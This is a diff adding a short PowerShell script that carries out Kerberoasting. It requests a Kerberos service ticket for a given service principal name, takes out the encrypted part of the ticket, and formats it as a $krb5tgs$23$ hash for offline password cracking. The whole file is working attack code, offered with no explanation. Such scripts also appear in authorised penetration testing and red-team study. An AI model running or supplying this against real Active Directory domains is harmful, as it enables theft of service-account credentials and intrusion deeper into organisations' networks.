@@ -1,0 +1,6 @@
+$SPN = ""
+Add-Type -AssemblyName System.IdentityModel
+$Context = (New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN).GetRequest()
+$HexData = [System.BitConverter]::ToString($Context) -replace '-'
+$EncPart = $HexData.Substring($HexData.IndexOf("3082"))
+"`$krb5tgs`$23`$*kadmin`*$($env:USERDNSDOMAIN)`*$SPN`*$EncPart"
